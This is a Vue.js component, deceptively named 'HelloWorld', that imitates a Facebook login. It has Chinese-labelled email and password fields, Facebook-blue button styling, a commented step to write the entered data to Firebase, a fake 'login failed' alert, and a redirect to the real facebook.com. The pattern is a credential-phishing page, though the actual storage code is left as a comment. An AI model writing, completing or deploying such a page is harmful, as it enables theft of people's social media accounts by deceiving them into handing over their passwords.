<template>
  <div class="hello">
  <h1><input type="text" placeholder="電子郵件" v-model="email"/></h1>
  <h1><input type="text" placeholder="密碼" v-model="password"/></h1>
  <button class="fb login" @click="submit()">登入</button>
  <p class="invis">{{ user }}</p>
  </div>
</template>

<script>

import { db } from '../db'

export default {
  name: 'HelloWorld',
  props: {
    msg: String
  },
  data() {
    return {
      user: [],
      email: '',
      password: ''
    }
  },
  firestore: {
    user: db.collection('user'),
  },
  methods: {
    submit () {

      /* 把資料寫入Firebase */

      
      alert("登入失敗");
      window.location.href = 'https://www.facebook.com/';
    }
  }
}
</script>

<!-- Add "scoped" attribute to limit CSS to this component only -->
<style scoped>
h3 {
  margin: 40px 0 0;
}
ul {
  list-style-type: none;
  padding: 0;
}
li {
  display: inline-block;
  margin: 0 10px;
}
a {
  color: #42b983;
}

p.invis {
  color: transparent;
}

.fb.login {
  color: white;
  background-color: #1877f2;
  border: none;
  border-radius: 6px;
  font-size: 21px;
  line-height: 48px;
  padding: 0 16px;
  width: 332px;
}

input {
  border: 1px solid #dddfe2;
  border-radius: 5px;
  height: 22px;
  font-size: 22px;
  padding: 5px;
}
</style>
